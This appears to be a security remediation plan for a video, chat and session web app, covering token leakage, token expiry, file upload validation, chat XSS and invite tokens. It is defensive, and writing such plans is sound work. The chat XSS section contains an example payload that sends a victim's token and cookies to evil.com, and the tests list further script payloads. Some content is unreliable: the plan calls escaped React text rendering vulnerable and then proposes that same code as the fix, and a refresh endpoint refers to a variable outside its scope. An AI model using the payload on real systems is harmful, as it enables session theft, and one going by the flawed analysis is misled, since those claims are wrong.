# Batch 5 Remediation Plan: Session/Video/Chat Security

**Date:** 2025-11-01
**Batch:** 5 of 6
**Surface:** Session/Video/Chat
**Branch:** `remediate/batch-5`
**Severity:** 🔴 **CRITICAL** - Security vulnerabilities block production

---

## Executive Summary

**Total Issues:** 6 P0 (critical security), 8 P1 (high priority), 11 P2 (polish)

**Estimated Effort:**
- P0 Security Fixes: 12-16 hours
- P1 Fixes: 6-8 hours
- P2 Fixes: 4-6 hours
- Testing & Verification: 6-8 hours
- **Total: 28-38 hours (3.5-5 days)**

**Risk Level:** HIGH - Security vulnerabilities allow:
- Session hijacking
- Malware distribution
- XSS attacks
- Token theft
- User data exposure

**Dependencies:**
- `isomorphic-dompurify` (XSS protection)
- `file-type` (magic byte validation)
- ClamAV or VirusTotal API (malware scanning)
- Environment variables for LiveKit configuration

---

## P0 Issues (Critical Security) - MUST FIX FIRST

### P0-1: LiveKit Token Metadata Leakage

**File:** `src/app/video/[id]/page.tsx`
**Lines:** 122-130
**Severity:** CRITICAL - User data exposed in JWT payload

**Current Code:**
```typescript
const { token, serverUrl } = await generateLiveKitToken({
  room: roomName,
  identity: identity,
  metadata: {
    sessionId,           // ❌ EXPOSED in base64 JWT
    userId: currentUserId,  // ❌ EXPOSED
    role: userRole,      // ❌ EXPOSED
  },
})
```

**Vulnerability:**
- JWT metadata is base64-encoded, NOT encrypted
- Anyone can decode token and extract sessionId, userId, role
- Enables targeted attacks on specific sessions/users

**Minimal Fix:**
```typescript
// REMOVE sensitive data from metadata entirely
const { token, serverUrl } = await generateLiveKitToken({
  room: roomName,
  identity: `${userRole}-${currentUserId}`, // Role in identity string
  // NO METADATA - Store session association server-side
})

// Server-side: Track room → session mapping in database
await supabaseAdmin.from('livekit_rooms').upsert({
  room_name: roomName,
  session_id: sessionId,
  user_id: currentUserId,
  role: userRole,
  created_at: new Date().toISOString(),
})
```

**Affected Flows:**
- Video session initialization
- LiveKit room joining
- Session participant tracking

**Test Steps:**
1. Join video session as customer
2. Intercept LiveKit token from network tab
3. Decode JWT payload: `echo $TOKEN | cut -d'.' -f2 | base64 -d`
4. **VERIFY:** No sessionId, userId, or role in metadata
5. **VERIFY:** Session still functions correctly
6. **VERIFY:** Identity string follows pattern: `customer-user_abc123`

**Manual QA Checklist:**
- [ ] Video session starts successfully
- [ ] Multiple participants can join
- [ ] Token contains no sensitive metadata
- [ ] Session tracking still works server-side
- [ ] Video/audio quality unchanged

---

### P0-2: No Token Expiration

**File:** `src/lib/livekit.ts`
**Lines:** 26-29
**Severity:** CRITICAL - Stolen tokens valid indefinitely

**Current Code:**
```typescript
const accessToken = new AccessToken(apiKey, apiSecret, {
  identity,
  metadata: metadata ? JSON.stringify(metadata) : undefined,
  // ❌ NO TTL - tokens never expire
})
```

**Vulnerability:**
- Tokens remain valid indefinitely
- Stolen tokens enable session hijacking days later
- No revocation mechanism

**Minimal Fix:**
```typescript
const accessToken = new AccessToken(apiKey, apiSecret, {
  identity,
  metadata: metadata ? JSON.stringify(metadata) : undefined,
  ttl: 3600, // ✅ 1 hour expiration (3600 seconds)
})

// Add token grant with explicit permissions
accessToken.addGrant({
  roomJoin: true,
  room: roomName,
  canPublish: true,
  canSubscribe: true,
})
```

**Add Token Refresh Endpoint:**
Create `src/app/api/livekit/refresh/route.ts`:
```typescript
import { NextRequest, NextResponse } from 'next/server'
import { generateLiveKitToken } from '@/lib/livekit'
import { requireCustomerAPI, requireMechanicAPI } from '@/lib/auth/guards'

export async function POST(request: NextRequest) {
  // Authenticate user
  const authResult = await requireCustomerAPI(request)
  if (authResult instanceof Response) {
    const mechanicResult = await requireMechanicAPI(request)
    if (mechanicResult instanceof Response) {
      return authResult // Not authenticated as customer or mechanic
    }
    const { user } = mechanicResult
    // Continue with mechanic
  } else {
    const { user } = authResult
    // Continue with customer
  }

  const { roomName } = await request.json()

  // Verify user has access to this room
  const { data: session } = await supabaseAdmin
    .from('livekit_rooms')
    .select('*')
    .eq('room_name', roomName)
    .eq('user_id', user.id)
    .single()

  if (!session) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 403 })
  }

  // Generate new token
  const { token, serverUrl } = await generateLiveKitToken({
    room: roomName,
    identity: session.identity,
  })

  return NextResponse.json({ token, serverUrl })
}
```

**Client-side Token Refresh:**
Update `src/app/video/[id]/VideoSessionClient.tsx`:
```typescript
// Add token refresh logic before expiration
useEffect(() => {
  if (!token) return

  // Refresh token 5 minutes before expiry
  const refreshTimeout = setTimeout(async () => {
    try {
      const response = await fetch('/api/livekit/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ roomName }),
      })
      const { token: newToken } = await response.json()
      setToken(newToken)
    } catch (error) {
      console.error('Token refresh failed:', error)
      // Handle refresh failure - show reconnect UI
    }
  }, 55 * 60 * 1000) // 55 minutes (5 min before 1hr expiry)

  return () => clearTimeout(refreshTimeout)
}, [token, roomName])
```

**Affected Flows:**
- All LiveKit token generation
- Video session duration > 1 hour
- Token refresh during active sessions

**Test Steps:**
1. Generate LiveKit token via API
2. Decode JWT: `echo $TOKEN | cut -d'.' -f2 | base64 -d | jq .exp`
3. **VERIFY:** `exp` field is present and ~3600 seconds from now
4. Start video session
5. Wait 55 minutes (or mock time)
6. **VERIFY:** Token refresh API called automatically
7. **VERIFY:** New token received and session continues
8. **VERIFY:** Session doesn't disconnect during refresh

**Manual QA Checklist:**
- [ ] New tokens have 1-hour expiration
- [ ] Token refresh works before expiration
- [ ] Session continues seamlessly after refresh
- [ ] Expired tokens rejected by LiveKit
- [ ] Error UI shown if refresh fails

---

### P0-3: No File Type Validation

**File:** `src/app/api/sessions/[id]/files/route.ts`
**Lines:** 105-109
**Severity:** CRITICAL - Allows malicious file uploads

**Current Code:**
```typescript
const maxSize = 10 * 1024 * 1024
if (file.size > maxSize) {
  return NextResponse.json({ error: 'File too large' }, { status: 400 })
}
// ❌ NO FILE TYPE CHECK - accepts .exe, .sh, .js, ANY file
```

**Vulnerability:**
- Accepts executable files (.exe, .sh, .bat, .js)
- No MIME type validation
- No magic byte verification
- Malware distribution vector

**Minimal Fix:**
```typescript
// 1. Add file-type package
// npm install file-type

import { fileTypeFromBuffer } from 'file-type'

// 2. Define whitelist
const ALLOWED_MIME_TYPES = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'image/webp',
  'application/pdf',
  'video/mp4',
  'video/quicktime',
]

const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf', '.mp4', '.mov']

// 3. Validate MIME type
const declaredType = file.type
if (!ALLOWED_MIME_TYPES.includes(declaredType)) {
  return NextResponse.json({
    error: `File type ${declaredType} not allowed. Allowed: images, PDF, videos`
  }, { status: 400 })
}

// 4. Validate file extension
const fileName = file.name.toLowerCase()
const hasAllowedExtension = ALLOWED_EXTENSIONS.some(ext => fileName.endsWith(ext))
if (!hasAllowedExtension) {
  return NextResponse.json({
    error: `File extension not allowed. Allowed: ${ALLOWED_EXTENSIONS.join(', ')}`
  }, { status: 400 })
}

// 5. Validate actual file content (magic bytes)
const buffer = Buffer.from(await file.arrayBuffer())
const detectedType = await fileTypeFromBuffer(buffer)

if (!detectedType) {
  return NextResponse.json({
    error: 'Unable to determine file type'
  }, { status: 400 })
}

if (!ALLOWED_MIME_TYPES.includes(detectedType.mime)) {
  await logSecurityEvent('file_type_mismatch', {
    user_id: userId,
    declared_type: declaredType,
    detected_type: detectedType.mime,
    filename: file.name,
  })
  return NextResponse.json({
    error: 'File content does not match declared type (possible malware)'
  }, { status: 400 })
}

// 6. Check file size
const maxSize = 10 * 1024 * 1024
if (file.size > maxSize) {
  return NextResponse.json({ error: 'File too large (max 10MB)' }, { status: 400 })
}

// Now safe to proceed to malware scan...
```

**Affected Flows:**
- File uploads during sessions
- Session file sharing
- File download by other participants

**Test Steps:**
1. **Test allowed file:** Upload legitimate.jpg
   - **VERIFY:** Upload succeeds
2. **Test executable:** Upload malware.exe
   - **VERIFY:** Rejected with "File type not allowed"
3. **Test extension spoofing:** Upload malware.exe.jpg (renamed)
   - **VERIFY:** Rejected with "content does not match type"
4. **Test double extension:** Upload invoice.pdf.exe
   - **VERIFY:** Rejected (extension check)
5. **Test oversized file:** Upload 15MB image
   - **VERIFY:** Rejected with "File too large"

**Manual QA Checklist:**
- [ ] JPG, PNG, GIF, WebP images upload successfully
- [ ] PDF files upload successfully
- [ ] MP4, MOV videos upload successfully
- [ ] EXE files rejected
- [ ] Shell scripts (.sh, .bat) rejected
- [ ] JavaScript files (.js) rejected
- [ ] Renamed executables (.exe.jpg) rejected
- [ ] Security events logged for mismatch attempts

---

### P0-4: No Malware Scanning

**File:** `src/app/api/sessions/[id]/files/route.ts`
**Lines:** 119-125
**Severity:** CRITICAL - Files uploaded without virus scan

**Current Code:**
```typescript
const { error: uploadError } = await supabaseAdmin.storage
  .from('session-files')
  .upload(storagePath, file, {
    cacheControl: '3600',
    upsert: false,
  })
// ❌ NO VIRUS SCAN - malware uploaded directly
```

**Vulnerability:**
- No antivirus scanning before upload
- Malware distributed to session participants
- Legal liability if platform distributes malware

**Minimal Fix (Adapter Pattern):**

Create `src/lib/security/malwareScan.ts`:
```typescript
/**
 * Malware scanning adapter
 * TODO: Integrate real antivirus service (ClamAV, VirusTotal, MetaDefender)
 */

interface ScanResult {
  clean: boolean
  infected: boolean
  virus?: string
  engine?: string
}

export async function scanFileForMalware(
  buffer: Buffer,
  filename: string
): Promise<ScanResult> {
  // Phase 1: Stub implementation with logging
  // TODO: Replace with real antivirus integration

  const VIRUS_TOTAL_API_KEY = process.env.VIRUS_TOTAL_API_KEY
  const CLAMAV_HOST = process.env.CLAMAV_HOST

  if (!VIRUS_TOTAL_API_KEY && !CLAMAV_HOST) {
    console.warn('[SECURITY] No malware scanning configured - file uploaded without scan')
    // In development: allow
    // In production: should block or require manual review
    if (process.env.NODE_ENV === 'production') {
      throw new Error('Malware scanning is required in production')
    }
    return { clean: true, infected: false }
  }

  // TODO: Implement VirusTotal integration
  if (VIRUS_TOTAL_API_KEY) {
    return await scanWithVirusTotal(buffer, filename, VIRUS_TOTAL_API_KEY)
  }

  // TODO: Implement ClamAV integration
  if (CLAMAV_HOST) {
    return await scanWithClamAV(buffer, filename, CLAMAV_HOST)
  }

  return { clean: true, infected: false }
}

async function scanWithVirusTotal(
  buffer: Buffer,
  filename: string,
  apiKey: string
): Promise<ScanResult> {
  // TODO: Implement VirusTotal API integration
  // https://developers.virustotal.com/reference/files-scan
  throw new Error('VirusTotal integration not yet implemented')
}

async function scanWithClamAV(
  buffer: Buffer,
  filename: string,
  host: string
): Promise<ScanResult> {
  // TODO: Implement ClamAV socket connection
  // Use node-clam or clamdjs package
  throw new Error('ClamAV integration not yet implemented')
}

export async function logMalwareDetection(details: {
  user_id: string
  session_id: string
  filename: string
  virus: string
  engine: string
}) {
  await supabaseAdmin.from('security_events').insert({
    event_type: 'malware_detected',
    user_id: details.user_id,
    metadata: details,
    severity: 'critical',
    created_at: new Date().toISOString(),
  })

  // TODO: Send alert to security team
  console.error('[SECURITY ALERT] Malware detected:', details)
}
```

**Update file upload route:**
```typescript
// src/app/api/sessions/[id]/files/route.ts
import { scanFileForMalware, logMalwareDetection } from '@/lib/security/malwareScan'

// After file type validation, before upload:

// Scan for malware
let scanResult
try {
  scanResult = await scanFileForMalware(buffer, file.name)
} catch (error) {
  console.error('Malware scan failed:', error)
  return NextResponse.json({
    error: 'File scanning unavailable. Please try again later.'
  }, { status: 503 })
}

if (scanResult.infected) {
  // Log security event
  await logMalwareDetection({
    user_id: userId,
    session_id: sessionId,
    filename: file.name,
    virus: scanResult.virus || 'unknown',
    engine: scanResult.engine || 'unknown',
  })

  return NextResponse.json({
    error: 'File blocked: contains malware or suspicious content'
  }, { status: 400 })
}

// Now safe to upload
const { error: uploadError } = await supabaseAdmin.storage
  .from('session-files')
  .upload(storagePath, buffer, {
    contentType: detectedType.mime,
    cacheControl: '3600',
    upsert: false,
  })
```

**Add Database Migration:**
Create `supabase/migrations/20251101000001_security_events.sql`:
```sql
-- Security events tracking table
CREATE TABLE IF NOT EXISTS security_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  event_type TEXT NOT NULL,
  user_id UUID REFERENCES auth.users(id),
  session_id UUID REFERENCES sessions(id),
  metadata JSONB,
  severity TEXT CHECK (severity IN ('low', 'medium', 'high', 'critical')),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_security_events_type ON security_events(event_type);
CREATE INDEX idx_security_events_user ON security_events(user_id);
CREATE INDEX idx_security_events_severity ON security_events(severity);
CREATE INDEX idx_security_events_created ON security_events(created_at DESC);

-- Enable RLS
ALTER TABLE security_events ENABLE ROW LEVEL SECURITY;

-- Only admins can read security events
CREATE POLICY "Admins can view security events" ON security_events
  FOR SELECT
  TO authenticated
  USING (
    EXISTS (
      SELECT 1 FROM profiles
      WHERE profiles.id = auth.uid()
      AND profiles.role = 'admin'
    )
  );
```

**Rollback:**
```sql
DROP TABLE IF EXISTS security_events CASCADE;
```

**Affected Flows:**
- All file uploads in sessions
- File download links generation
- Security monitoring and alerting

**Test Steps:**
1. **Test clean file:** Upload legitimate.jpg
   - **VERIFY:** Scan completes successfully
   - **VERIFY:** File uploaded to storage
2. **Test EICAR test file:** Upload EICAR.com (standard test virus)
   - **VERIFY:** Rejected with "contains malware"
   - **VERIFY:** Security event logged in database
   - **VERIFY:** File NOT in storage
3. **Test scan failure:** Temporarily disable scanning service
   - **VERIFY:** Error message shown
   - **VERIFY:** File NOT uploaded
4. **Test large file:** Upload 10MB clean file
   - **VERIFY:** Scan completes (may take time)
   - **VERIFY:** Upload succeeds

**Manual QA Checklist:**
- [ ] Malware scanning adapter implemented
- [ ] Clean files upload successfully
- [ ] EICAR test file blocked
- [ ] Security events logged to database
- [ ] Scan failures handled gracefully
- [ ] Production guard prevents unscanned uploads
- [ ] Environment variables documented

**Future Integration Tasks (Post-P0):**
- [ ] Integrate VirusTotal API (requires API key)
- [ ] OR deploy ClamAV container (self-hosted)
- [ ] Add file quarantine system
- [ ] Implement scan result caching (hash-based)
- [ ] Add admin dashboard for security events
- [ ] Set up alerting for malware detections

---

### P0-5: Chat XSS Vulnerability

**File:** `src/app/video/[id]/VideoSessionClient.tsx`
**Lines:** 1595
**Severity:** CRITICAL - Script injection via chat messages

**Current Code:**
```typescript
<p className="break-words text-sm leading-relaxed whitespace-pre-wrap">
  {msg.text}  // ❌ NO SANITIZATION - allows HTML/JavaScript
</p>
```

**Vulnerability:**
- Chat messages rendered as-is without sanitization
- Attacker can inject `<script>`, `<img onerror>`, `<iframe>` tags
- Enables token theft, session hijacking, phishing

**Attack Example:**
```javascript
// Attacker sends this message:
`<img src=x onerror="fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: localStorage.getItem('livekit-token'),
    cookies: document.cookie
  })
})">`

// Victim's browser executes onerror handler
// Attacker receives victim's token and cookies
```

**Minimal Fix:**

Install DOMPurify:
```bash
npm install isomorphic-dompurify
```

**Option 1: Strip all HTML (recommended):**
```typescript
import DOMPurify from 'isomorphic-dompurify'

<p
  className="break-words text-sm leading-relaxed whitespace-pre-wrap"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(msg.text, {
      ALLOWED_TAGS: [], // No HTML tags allowed
      ALLOWED_ATTR: [], // No attributes allowed
      KEEP_CONTENT: true, // Keep text content
    })
  }}
/>
```

**Option 2: Allow safe formatting (bold, italic, links):**
```typescript
<p
  className="break-words text-sm leading-relaxed whitespace-pre-wrap"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(msg.text, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'br'],
      ALLOWED_ATTR: {
        'a': ['href', 'title', 'target'],
      },
      ALLOWED_URI_REGEXP: /^https?:\/\//i, // Only http(s) links
    })
  }}
/>
```

**Option 3: Use React text rendering (safest, no formatting):**
```typescript
// Replace dangerouslySetInnerHTML with text content
<p className="break-words text-sm leading-relaxed whitespace-pre-wrap">
  {msg.text}
</p>
// React automatically escapes text content - no XSS possible
```

**Server-side Sanitization (Defense in Depth):**

Update `src/app/api/chat/send-message/route.ts`:
```typescript
import DOMPurify from 'isomorphic-dompurify'

export async function POST(request: NextRequest) {
  const { sessionId, text } = await request.json()

  // Sanitize message server-side BEFORE storing
  const sanitizedText = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
  })

  // Store sanitized version
  const { data, error } = await supabaseAdmin
    .from('chat_messages')
    .insert({
      session_id: sessionId,
      user_id: userId,
      text: sanitizedText, // ✅ Already sanitized
      created_at: new Date().toISOString(),
    })
    .select()
    .single()

  // Broadcast sanitized message
  await supabaseAdmin
    .from('chat_messages')
    .update({ text: sanitizedText })
    .eq('id', data.id)

  return NextResponse.json({ message: data })
}
```

**Affected Flows:**
- Chat message sending
- Chat message rendering
- Real-time message broadcasts

**Test Steps:**
1. **Test XSS attempt:** Send message: `<script>alert('XSS')</script>`
   - **VERIFY:** Script tags stripped or escaped
   - **VERIFY:** Alert does NOT execute
2. **Test image XSS:** Send: `<img src=x onerror="alert('XSS')">`
   - **VERIFY:** Image tag stripped
   - **VERIFY:** Alert does NOT execute
3. **Test iframe:** Send: `<iframe src="https://evil.com"></iframe>`
   - **VERIFY:** Iframe stripped
4. **Test normal text:** Send: `Hello world! How are you?`
   - **VERIFY:** Message displays normally
5. **Test special chars:** Send: `<b>Bold</b> & "quotes"`
   - **VERIFY:** HTML entities escaped or tags allowed per config
6. **Test link:** Send: `Check https://example.com`
   - **VERIFY:** Link displays (optionally clickable if allowed)

**Manual QA Checklist:**
- [ ] DOMPurify installed and imported
- [ ] Client-side sanitization working
- [ ] Server-side sanitization working
- [ ] XSS payloads blocked
- [ ] Normal messages display correctly
- [ ] Links work (if allowed in config)
- [ ] Message formatting preserved (if allowed)
- [ ] No console errors

---

### P0-6: Session Invite Token in URL

**File:** `src/app/api/session/invite/route.ts`
**Lines:** 48
**Severity:** CRITICAL - Tokens logged everywhere

**Current Code:**
```typescript
const inviteUrl = `${origin}/${sessionRoute}/${sessionId}?mechanic_token=${encodeURIComponent(token)}`
// ❌ Token in query parameter - logged in:
// - Browser history
// - Server access logs
// - Analytics platforms
// - Referrer headers
```

**Vulnerability:**
- Tokens exposed in URLs
- Logged in browser history (persistent)
- Logged in web server logs
- Sent in Referer headers to third parties
- Leaked via analytics (Google Analytics, etc.)

**Minimal Fix:**

**Option 1: Use POST Body (Recommended):**

Update invite API to return invite code instead of URL:
```typescript
// src/app/api/session/invite/route.ts
export async function POST(request: NextRequest) {
  const { sessionId } = await request.json()

  // Generate short invite code instead of JWT
  const inviteCode = crypto.randomBytes(8).toString('hex') // 16 chars

  // Store invite code in database with expiration
  await supabaseAdmin.from('session_invites').insert({
    session_id: sessionId,
    invite_code: inviteCode,
    created_by: userId,
    expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(), // 24 hours
    used: false,
  })

  // Return invite code (NOT full URL)
  const inviteUrl = `${origin}/${sessionRoute}/${sessionId}/join?code=${inviteCode}`

  return NextResponse.json({ inviteUrl, inviteCode })
}
```

Create join endpoint:
```typescript
// src/app/api/session/[id]/join/route.ts
export async function POST(request: NextRequest, { params }: { params: { id: string } }) {
  const sessionId = params.id
  const { code } = await request.json()

  // Verify invite code
  const { data: invite } = await supabaseAdmin
    .from('session_invites')
    .select('*')
    .eq('session_id', sessionId)
    .eq('invite_code', code)
    .single()

  if (!invite) {
    return NextResponse.json({ error: 'Invalid invite code' }, { status: 400 })
  }

  if (invite.used) {
    return NextResponse.json({ error: 'Invite code already used' }, { status: 400 })
  }

  if (new Date(invite.expires_at) < new Date()) {
    return NextResponse.json({ error: 'Invite code expired' }, { status: 400 })
  }

  // Mark as used
  await supabaseAdmin
    .from('session_invites')
    .update({ used: true, used_at: new Date().toISOString() })
    .eq('id', invite.id)

  // Generate LiveKit token for this mechanic
  const { token, serverUrl } = await generateLiveKitToken({
    room: `session-${sessionId}`,
    identity: `mechanic-${userId}`,
  })

  return NextResponse.json({ token, serverUrl })
}
```

Add database migration:
```sql
-- supabase/migrations/20251101000002_session_invites.sql
CREATE TABLE IF NOT EXISTS session_invites (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id UUID NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
  invite_code TEXT NOT NULL UNIQUE,
  created_by UUID REFERENCES auth.users(id),
  created_at TIMESTAMPTZ DEFAULT NOW(),
  expires_at TIMESTAMPTZ NOT NULL,
  used BOOLEAN DEFAULT FALSE,
  used_at TIMESTAMPTZ,
  used_by UUID REFERENCES auth.users(id)
);

CREATE INDEX idx_session_invites_code ON session_invites(invite_code);
CREATE INDEX idx_session_invites_session ON session_invites(session_id);
CREATE INDEX idx_session_invites_expires ON session_invites(expires_at);

-- Enable RLS
ALTER TABLE session_invites ENABLE ROW LEVEL SECURITY;

-- Mechanics can use invite codes
CREATE POLICY "Authenticated users can use invite codes" ON session_invites
  FOR SELECT
  TO authenticated
  USING (NOT used AND expires_at > NOW());
```

**Rollback:**
```sql
DROP TABLE IF EXISTS session_invites CASCADE;
```

**Option 2: Secure Cookie (Alternative):**
```typescript
// Set token in httpOnly, secure cookie
export async function POST(request: NextRequest) {
  const { sessionId } = await request.json()

  const token = generateInviteToken(sessionId)

  const response = NextResponse.json({ success: true })
  response.cookies.set('session_invite', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60, // 24 hours
    path: `/session/${sessionId}`,
  })

  return response
}
```

**Affected Flows:**
- Mechanic invite generation
- Mechanic session joining
- Invite link sharing

**Test Steps:**
1. **Generate invite:** Create session invite as customer
   - **VERIFY:** Response contains invite code (NOT full token)
   - **VERIFY:** Invite URL contains short code
2. **Join via invite:** Use invite URL as mechanic
   - **VERIFY:** Redirects to join page
   - **VERIFY:** Join page requests invite code
   - **VERIFY:** POST to /join endpoint with code
   - **VERIFY:** Receives LiveKit token in response
3. **Reuse invite:** Try using same invite code twice
   - **VERIFY:** Second attempt rejected "already used"
4. **Expired invite:** Create invite, wait 24+ hours (or mock time)
   - **VERIFY:** Rejected "invite expired"
5. **Invalid code:** Use random/wrong invite code
   - **VERIFY:** Rejected "invalid invite"

**Manual QA Checklist:**
- [ ] Invite codes generated (16 chars)
- [ ] Invites stored in database
- [ ] Invite URLs contain codes (not tokens)
- [ ] Join endpoint validates codes
- [ ] One-time use enforced
- [ ] Expiration enforced (24 hours)
- [ ] Used invites marked in database
- [ ] No tokens in browser history
- [ ] No tokens in URL query parameters

---

## P1 Issues (High Priority)

### P1-1: Mock Data in Production API

**File:** `src/app/api/sessions/[id]/route.ts`
**Lines:** 5-16

**Current Code:**
```typescript
const MOCK_SESSION: SessionSummary = {
  id: 'queue-1',
  vehicle: '2020 Audi Q5',
  // ... hardcoded fake data
}

export async function GET() {
  return NextResponse.json({ session: MOCK_SESSION })
}
```

**Fix:**
```typescript
export async function GET(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  const sessionId = params.id

  // Authenticate request
  const authResult = await requireCustomerAPI(request)
  if (authResult instanceof Response) return authResult
  const { user } = authResult

  // Query real session data
  const { data: session, error } = await supabaseAdmin
    .from('sessions')
    .select(`
      id,
      status,
      created_at,
      scheduled_time,
      customer_id,
      mechanic_id,
      vehicle:vehicles(make, model, year),
      session_type
    `)
    .eq('id', sessionId)
    .single()

  if (error || !session) {
    return NextResponse.json({ error: 'Session not found' }, { status: 404 })
  }

  // Verify user has access
  if (session.customer_id !== user.id) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 403 })
  }

  return NextResponse.json({ session })
}
```

**Test:** Query `/api/sessions/{real-session-id}` and verify real data returned.

---

### P1-2 through P1-8: Additional P1 Issues

*(See batch-5.md lines 120-132 for details)*

**P1-2:** Dual table pattern - Unify sessions/diagnostic_sessions
**P1-3:** Type safety - Remove `as any` casts
**P1-4:** Inconsistent channels - Standardize naming
**P1-5:** Missing error handling - Add Supabase subscription error handlers
**P1-6:** No TTL verification - Validate signed URL expiration
**P1-7:** Timezone issues - Use UTC throughout
**P1-8:** Token in query param - Already fixed in P0-6

**Effort:** 6-8 hours total for P1 issues

---

## P2 Issues (Polish) - 11 Issues

*(See batch-5.md lines 136-150 for full list)*

Issues include:
- Incomplete stubs
- Hardcoded pricing
- Missing error states
- Debug code in production
- Auth restrictions
- Disconnected features

**Effort:** 4-6 hours total
**Priority:** Address after P0/P1 complete

---

## Testing Strategy

### Security Testing

**XSS Testing:**
```bash
# Test chat XSS payloads
curl -X POST http://localhost:3000/api/chat/send-message \
  -H "Content-Type: application/json" \
  -H "Cookie: $AUTH_COOKIE" \
  -d '{"sessionId":"sess_123","text":"<script>alert(1)</script>"}'

# Verify: Response contains sanitized text without script tags
```

**File Upload Testing:**
```bash
# Test malicious file upload
curl -X POST http://localhost:3000/api/sessions/sess_123/files \
  -H "Cookie: $AUTH_COOKIE" \
  -F "file=@malware.exe"

# Verify: Rejected with 400 error

# Test EICAR test virus
curl -X POST http://localhost:3000/api/sessions/sess_123/files \
  -H "Cookie: $AUTH_COOKIE" \
  -F "file=@eicar.com"

# Verify: Rejected, security event logged
```

**Token Expiration Testing:**
```bash
# Generate token, decode and check expiry
curl -X POST http://localhost:3000/api/livekit/token \
  -H "Cookie: $AUTH_COOKIE" \
  -d '{"roomName":"session-123"}' | jq -r '.token' | \
  cut -d'.' -f2 | base64 -d | jq .exp

# Verify: exp field present, ~3600 seconds from now
```

### Integration Testing

**Video Session Flow:**
1. Customer creates session
2. Mechanic accepts session
3. Both join video room
4. LiveKit tokens validated
5. No sensitive data in token metadata
6. Token expires after 1 hour
7. Token refresh works before expiry

**File Upload Flow:**
1. Upload clean image → Success
2. Upload PDF → Success
3. Upload .exe → Rejected
4. Upload .exe.jpg → Rejected (content mismatch)
5. Upload EICAR → Rejected, logged
6. Download uploaded file → Success

**Chat Flow:**
1. Send normal message → Displays correctly
2. Send XSS payload → Sanitized
3. Send link → Displays safely
4. Messages broadcast to all participants
5. No script execution

### Manual QA Checklist

#### Pre-deployment Checklist
- [ ] All P0 fixes implemented
- [ ] Security tests pass
- [ ] Integration tests pass
- [ ] No tokens in URLs
- [ ] No sensitive data in JWT metadata
- [ ] File uploads validated and scanned
- [ ] Chat messages sanitized
- [ ] Token expiration enforced
- [ ] Environment variables documented

#### Environment Variables Required
```env
# LiveKit Configuration
NEXT_PUBLIC_LIVEKIT_URL=wss://your-livekit.cloud
LIVEKIT_API_KEY=your_api_key
LIVEKIT_API_SECRET=your_api_secret

# Malware Scanning (choose one)
VIRUS_TOTAL_API_KEY=your_virustotal_key
# OR
CLAMAV_HOST=localhost:3310

# Database
NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key
```

---

## Rollback Plan

**If issues found after deployment:**

1. **Immediate:** Revert to previous branch
   ```bash
   git revert HEAD
   git push origin main
   ```

2. **Database migrations:** Run rollback scripts
   ```bash
   psql $DATABASE_URL -f supabase/migrations/rollback_session_invites.sql
   psql $DATABASE_URL -f supabase/migrations/rollback_security_events.sql
   ```

3. **Environment:** Remove new env vars if needed

4. **Monitoring:** Check for:
   - Increased error rates
   - Failed file uploads
   - Token generation failures
   - Video session connection issues

---

## Definition of Done

- [ ] All P0 security fixes implemented
- [ ] All affected flows tested
- [ ] Security tests pass
- [ ] No regressions in existing features
- [ ] Database migrations applied
- [ ] Environment variables documented
- [ ] Verification report completed
- [ ] Pull request created
- [ ] Code review completed
- [ ] QA approval received

---

**Next Steps:**
1. Review this plan
2. Get approval: **APPROVE PLAN 5**
3. Create branch `remediate/batch-5`
4. Implement fixes
5. Run tests
6. Create verification report
7. Open pull request
8. HALT for review

**Questions/Concerns:**
- Malware scanning: Should we use VirusTotal (cloud) or ClamAV (self-hosted)?
- Token refresh: 1-hour expiration acceptable or too short?
- File types: Current whitelist sufficient or need more types?
- Testing: Need dedicated security testing environment?
